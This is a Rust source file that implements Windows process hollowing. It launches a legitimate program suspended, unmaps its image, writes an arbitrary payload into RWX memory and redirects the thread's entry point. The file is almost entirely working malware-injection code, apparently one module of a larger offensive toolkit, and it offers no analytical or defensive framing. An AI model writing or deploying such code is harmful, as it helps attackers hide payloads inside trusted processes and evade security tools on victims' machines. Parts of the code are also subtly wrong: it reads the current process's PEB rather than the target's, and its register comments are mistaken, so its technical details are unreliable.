// Process Hollowing
// Injects payload into a legitimate suspended process

use winapi::um::winnt::*;
use winapi::um::processthreadsapi::*;
use winapi::um::memoryapi::*;
use winapi::um::handleapi::*;
use winapi::um::errhandlingapi::*;
use winapi::shared::minwindef::*;
use winapi::shared::basetsd::*;
use winapi::shared::ntdef::NTSTATUS;
use std::ptr;
use std::ffi::CString;
use crate::api_resolver::resolve_api;

/// Process hollowing result
pub struct HollowedProcess {
    pub process_handle: HANDLE,
    pub thread_handle: HANDLE,
}

/// Create a suspended process
pub unsafe fn create_suspended_process(
    target_path: &str,
) -> Result<HollowedProcess, String> {
    let path_cstr = CString::new(target_path)
        .map_err(|_| "Invalid target path".to_string())?;
    
    let mut startup_info = STARTUPINFOA {
        cb: std::mem::size_of::<STARTUPINFOA>() as u32,
        ..Default::default()
    };
    let mut process_info = PROCESS_INFORMATION::default();
    
    let success = CreateProcessA(
        path_cstr.as_ptr() as *const i8,
        ptr::null_mut(),
        ptr::null_mut(),
        ptr::null_mut(),
        0,
        CREATE_SUSPENDED,
        ptr::null_mut(),
        ptr::null_mut(),
        &mut startup_info,
        &mut process_info,
    );
    
    if success == 0 {
        return Err(format!("Failed to create suspended process: {}", GetLastError()));
    }
    
    Ok(HollowedProcess {
        process_handle: process_info.hProcess,
        thread_handle: process_info.hThread,
    })
}

/// Get process image base from thread context
pub unsafe fn get_process_image_base(
    thread_handle: HANDLE,
) -> Result<*mut winapi::ctypes::c_void, String> {
    let mut context = CONTEXT {
        ContextFlags: CONTEXT_FULL,
        ..Default::default()
    };
    
    #[cfg(target_arch = "x86_64")]
    {
        context.ContextFlags = CONTEXT_FULL;
        if GetThreadContext(thread_handle, &mut context) == 0 {
            return Err(format!("Failed to get thread context: {}", GetLastError()));
        }
        
        // On x64, image base is in RCX (first parameter to main)
        // We need to read it from PEB
        // PEB is at GS:[0x60], and ImageBaseAddress is at offset 0x10
        let peb_ptr: *mut u8;
        std::arch::asm!(
            "mov {}, gs:[0x60]",
            out(reg) peb_ptr,
            options(nostack, nomem, preserves_flags)
        );
        
        if peb_ptr.is_null() {
            return Err("Failed to get PEB".to_string());
        }
        
        // ImageBaseAddress is at PEB + 0x10 (byte offset, not pointer offset)
        let image_base_ptr = peb_ptr.add(0x10) as *const *mut winapi::ctypes::c_void;
        let image_base = *image_base_ptr;
        Ok(image_base)
    }
    
    #[cfg(target_arch = "x86")]
    {
        context.ContextFlags = CONTEXT_FULL;
        if GetThreadContext(thread_handle, &mut context) == 0 {
            return Err(format!("Failed to get thread context: {}", GetLastError()));
        }
        
        // On x86, image base is in EAX (first parameter to main)
        // We need to read it from PEB
        // PEB is at FS:[0x30], and ImageBaseAddress is at offset 0x08
        let peb_ptr: *mut u8;
        std::arch::asm!(
            "mov {}, fs:[0x30]",
            out(reg) peb_ptr,
            options(nostack, nomem, preserves_flags)
        );
        
        if peb_ptr.is_null() {
            return Err("Failed to get PEB".to_string());
        }
        
        // ImageBaseAddress is at PEB + 0x08 (byte offset, not pointer offset)
        let image_base_ptr = peb_ptr.add(0x08) as *const *mut winapi::ctypes::c_void;
        let image_base = *image_base_ptr;
        Ok(image_base)
    }
    
    #[cfg(not(any(target_arch = "x86", target_arch = "x86_64")))]
    {
        Err("Unsupported architecture".to_string())
    }
}

/// Unmap original image from process
pub unsafe fn unmap_original_image(
    process_handle: HANDLE,
    image_base: *mut winapi::ctypes::c_void,
) -> Result<(), String> {
    // Resolve NtUnmapViewOfSection
    let nt_unmap = resolve_api("ntdll.dll", "NtUnmapViewOfSection")
        .ok_or_else(|| "Failed to resolve NtUnmapViewOfSection".to_string())?;
    
    type NtUnmapViewOfSection = extern "system" fn(
        ProcessHandle: HANDLE,
        BaseAddress: *mut winapi::ctypes::c_void,
    ) -> NTSTATUS;
    
    let unmap_fn: NtUnmapViewOfSection = std::mem::transmute(nt_unmap);
    let status = unmap_fn(process_handle, image_base);
    
    // NTSTATUS: 0x00000000 is success, negative values are errors
    // But NTSTATUS is unsigned, so we check for non-zero (error codes are typically 0xC0000000+)
    if status != 0 && (status as i32) < 0 {
        return Err(format!("Failed to unmap image: 0x{:08X}", status));
    }
    
    Ok(())
}

/// Allocate memory in target process
pub unsafe fn allocate_memory_in_process(
    process_handle: HANDLE,
    address: *mut winapi::ctypes::c_void,
    size: usize,
) -> Result<*mut winapi::ctypes::c_void, String> {
    let allocated = VirtualAllocEx(
        process_handle,
        address,
        size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE,
    );
    
    if allocated.is_null() {
        // Try allocating at any address
        let allocated = VirtualAllocEx(
            process_handle,
            ptr::null_mut(),
            size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );
        
        if allocated.is_null() {
            return Err(format!("Failed to allocate memory: {}", GetLastError()));
        }
        
        return Ok(allocated);
    }
    
    Ok(allocated)
}

/// Write payload to target process
pub unsafe fn write_payload_to_process(
    process_handle: HANDLE,
    base_address: *mut winapi::ctypes::c_void,
    payload_data: &[u8],
) -> Result<(), String> {
    let mut bytes_written = 0usize;
    
    let success = WriteProcessMemory(
        process_handle,
        base_address,
        payload_data.as_ptr() as *const winapi::ctypes::c_void,
        payload_data.len(),
        &mut bytes_written,
    );
    
    if success == 0 {
        return Err(format!("Failed to write payload: {}", GetLastError()));
    }
    
    if bytes_written != payload_data.len() {
        return Err(format!("Partial write: {}/{} bytes", bytes_written, payload_data.len()));
    }
    
    Ok(())
}

/// Update thread context with new entry point
pub unsafe fn update_thread_context(
    thread_handle: HANDLE,
    entry_point: *mut winapi::ctypes::c_void,
) -> Result<(), String> {
    let mut context = CONTEXT {
        ContextFlags: CONTEXT_FULL,
        ..Default::default()
    };
    
    if GetThreadContext(thread_handle, &mut context) == 0 {
        return Err(format!("Failed to get thread context: {}", GetLastError()));
    }
    
    #[cfg(target_arch = "x86_64")]
    {
        // Set RIP to entry point (instruction pointer on x64)
        context.Rip = entry_point as u64;
    }
    
    #[cfg(target_arch = "x86")]
    {
        // Set EIP to entry point (instruction pointer on x86)
        context.Eip = entry_point as u32;
    }
    
    if SetThreadContext(thread_handle, &context) == 0 {
        return Err(format!("Failed to set thread context: {}", GetLastError()));
    }
    
    Ok(())
}

/// Resume thread execution
pub unsafe fn resume_thread(thread_handle: HANDLE) -> Result<(), String> {
    let result = ResumeThread(thread_handle);
    
    if result == u32::MAX {
        return Err(format!("Failed to resume thread: {}", GetLastError()));
    }
    
    Ok(())
}

/// Perform complete process hollowing
pub unsafe fn hollow_process(
    target_path: &str,
    payload_data: &[u8],
    entry_point_rva: usize,
) -> Result<HollowedProcess, String> {
    // Step 1: Create suspended process
    let hollowed = create_suspended_process(target_path)?;
    
    // Step 2: Get process image base
    let image_base = get_process_image_base(hollowed.thread_handle)?;
    
    // Step 3: Unmap original image
    let _ = unmap_original_image(hollowed.process_handle, image_base);
    // Continue even if unmapping fails (process might not be mapped yet)
    
    // Step 4: Allocate memory in target process
    let allocated_base = allocate_memory_in_process(
        hollowed.process_handle,
        image_base,
        payload_data.len(),
    )?;
    
    // Step 5: Write payload to target process
    write_payload_to_process(hollowed.process_handle, allocated_base, payload_data)?;
    
    // Step 6: Calculate entry point
    let entry_point = (allocated_base as usize + entry_point_rva) as *mut winapi::ctypes::c_void;
    
    // Step 7: Update thread context
    update_thread_context(hollowed.thread_handle, entry_point)?;
    
    // Step 8: Resume thread (caller should do this)
    // resume_thread(hollowed.thread_handle)?;
    
    Ok(hollowed)
}
